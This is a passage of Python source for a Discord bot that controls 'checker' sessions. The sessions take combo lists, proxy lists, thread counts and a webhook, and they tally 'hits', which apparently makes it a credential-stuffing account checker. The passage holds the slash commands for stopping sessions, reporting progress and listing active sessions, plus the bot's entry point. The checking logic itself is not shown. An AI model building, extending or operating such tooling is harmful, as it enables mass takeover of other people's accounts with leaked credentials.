    class CtxLike:
        def __init__(self, inter):
            self.author = inter.user
            self.channel = inter.channel
            self.send = inter.followup.send
            self.id = inter.id

    ctx_like = CtxLike(interaction)
    sess = CheckerSession(ctx_like, threads, mapped, combos_path,
                          proxies_path, webhook_url)
    active_checkers[sess.session_id] = sess
    asyncio.create_task(sess.run_checker())


@bot.tree.command(name="stop", description="Stop your checking session(s)")
@app_commands.describe(session_id="Session ID to stop (leave blank for all yours)")
async def stop(interaction: discord.Interaction,
               session_id: str | None = None):
    await interaction.response.defer(thinking=True)
    stopped = []

    if session_id:
        sess = active_checkers.get(session_id)
        if not sess:
            await interaction.followup.send("❌ Session not found.")
            return
        if sess.ctx.author.id != interaction.user.id:
            await interaction.followup.send("❌ That's not your session.")
            return
        sess.is_running = False
        stopped.append(sess)
        await interaction.followup.send(f"🛑 Stopped session `{session_id}`")
    else:
        mine = [s for s in active_checkers.values()
                if s.ctx.author.id == interaction.user.id and s.is_running]
        if not mine:
            await interaction.followup.send("❌ No active sessions.")
            return
        for s in mine:
            s.is_running = False
            stopped.append(s)
        await interaction.followup.send(f"🛑 Stopped **{len(stopped)}** session(s).")

    for s in stopped:
        try:
            await s.send_final_summary("🛑 Checker Stopped")
            await s.send_results_to_dm()
        except Exception:
            pass


@bot.tree.command(name="status", description="Check session status")
@app_commands.describe(session_id="Session ID (leave blank to list all yours)")
async def status(interaction: discord.Interaction,
                 session_id: str = None):
    await interaction.response.defer()
    if session_id:
        sess = active_checkers.get(session_id)
        if not sess:
            await interaction.followup.send("❌ Session not found.")
            return
        if sess.ctx.author.id != interaction.user.id:
            await interaction.followup.send("❌ That's not your session.")
            return
        # Update ctx so status reply goes to this interaction
        class _Ctx:
            def __init__(self, inter):
                self.author = inter.user
                self.channel = inter.channel
                self.send = inter.followup.send
                self.id = inter.id
        sess.ctx = _Ctx(interaction)
        await sess.send_status_update()
    else:
        mine = [s for s in active_checkers.values()
                if s.ctx.author.id == interaction.user.id and s.is_running]
        if not mine:
            await interaction.followup.send("❌ No active sessions.")
            return
        embed = discord.Embed(title="📊 Your Active Sessions",
                              color=discord.Color.blue())
        for s in mine:
            total = s.stats["total"] or 1
            pct = s.stats["checked"] / total * 100
            embed.add_field(
                name=f"Session {s.session_id[:8]}...",
                value=f"Progress: {s.stats['checked']}/{s.stats['total']} ({pct:.1f}%)\nHits: {s.stats['hits']}",
                inline=True,
            )
        await interaction.followup.send(embed=embed)


@bot.tree.command(name="list", description="List all active sessions")
async def list_sessions(interaction: discord.Interaction):
    await interaction.response.defer()
    active = [s for s in active_checkers.values() if s.is_running]
    if not active:
        await interaction.followup.send("❌ No active sessions.")
        return
    embed = discord.Embed(title="📋 All Active Sessions",
                          color=discord.Color.purple())
    for s in active:
        total = s.stats["total"] or 1
        pct = s.stats["checked"] / total * 100
        embed.add_field(
            name=f"{s.ctx.author.name} — {s.session_id[:8]}...",
            value=(f"Progress: {s.stats['checked']}/{s.stats['total']} ({pct:.1f}%)\n"
                   f"Hits: {s.stats['hits']}  Threads: {s.threads}"),
            inline=True,
        )
    await interaction.followup.send(embed=embed)


# ── entry point ────────────────────────────────────────────────────────
if __name__ == "__main__":
    load_dotenv()
    token = os.getenv("BOT_TOKEN")
    if not token:
        print("❌ No BOT_TOKEN in environment")
        sys.exit(1)
    print("🚀 Starting bot...")
    bot.run(token)
